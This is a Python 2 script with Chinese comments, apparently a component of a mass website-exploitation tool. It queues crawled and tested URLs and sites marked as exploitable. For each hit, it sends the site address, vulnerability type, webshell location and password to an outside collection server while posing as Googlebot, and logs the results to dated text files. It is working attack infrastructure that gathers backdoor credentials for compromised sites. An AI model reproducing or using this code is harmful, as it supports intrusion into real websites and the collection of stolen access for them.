#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
#线程操作消息队列
import threading
import Queue
import time
import urllib2

Aopenurl = Queue.Queue() #要采集的URL    #当有多个线程共享一个东西的时候就可以用它了
Bopenurl = Queue.Queue() #需要测试的URL
Burl = Queue.Queue() #链接成功的URL
exp_url = Queue.Queue() #存在EXP漏洞的  ["wwww.xxx.com","IIS_webdav","http://XXXX","备注"]
class C_Queue(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def print_Queue(self):
        try:
            print u"-----------------------------------------"
            print u"Aopenurl---------0--------%s"%(Aopenurl.qsize())
            print u"Bopenurl---------0--------%s"%(Bopenurl.qsize())
            print u"Burl-------------0--------%s"%(Burl.qsize())
            print u"exp_url----------0--------%s"%(exp_url.qsize())
            print u"-----------------------------------------"
        except Exception,e:
            print e
            return 0

    def run(self):
        try:
            while True:
                self.print_Queue()
                self.add_txt_exp_url()  #对exp_url进行存储
                time.sleep(10)
        except Exception,e:
            print e
            time.sleep(60)
            self.run()

    def TXT_file(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines("\r\n")
            file_object.writelines(data)
            file_object.close()
        except Exception,e:
            print e
            return 0

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
            return 1
        except:
            return 0

    def add_txt_exp_url(self):
        try:
            if exp_url.empty():   #判断队列是否为空
                time.sleep(10)
                return 0
            int_exp=int(exp_url.qsize())
            for i in range(int(int_exp)):
                self.Chost = exp_url.get(0.5)  #get()方法从队头删除并返回一个项目
                if self.Chost[0]:  ##["一句话 是否成功0否 1是","网址","漏洞类型","漏洞地址","密码","备注"] 6
                #是
                    url="http://www.999kankan.com/URL_EXP.php?yijuhua=%s&url=%s&exp=%s&expR=%s&webshell=%s&password=%s&bz=%s"%(str(self.Chost[0]),str(self.Chost[1]),str(self.Chost[2]),str(self.Chost[3]),str(self.Chost[4]),str(self.Chost[5]),str(self.Chost[6]))
                    if self.url_post(url):
                        print "--OK--%s"%(self.Chost)
                        file_nem=time.strftime('%Y.%m.%d')
                        self.TXT_file(file_nem+"OK.txt",str(self.Chost))  #写入文本
                else:
                    print "--NO--%s"%(self.Chost)
                    file_nem=time.strftime('%Y.%m.%d')
                    self.TXT_file(file_nem+"NO.txt",str(self.Chost))  #写入文本
                time.sleep(0.5)
        except Exception,e:
            print "222222222222222222222222",e
            return 0

################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(C_Queue())
    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程